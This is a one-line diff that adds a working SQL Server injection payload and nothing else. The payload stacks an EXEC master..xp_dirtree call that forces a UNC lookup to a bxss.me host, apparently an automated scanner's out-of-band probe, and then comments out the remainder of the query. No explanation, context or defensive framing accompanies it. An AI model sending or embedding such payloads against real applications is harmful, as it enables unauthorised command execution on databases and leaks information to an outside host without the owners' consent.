@@ -1,0 +1,1 @@
+1;EXEC master..xp_dirtree '\\dns.sqli.058649.16-8681.16.8cca1.1.bxss.me\' -- 
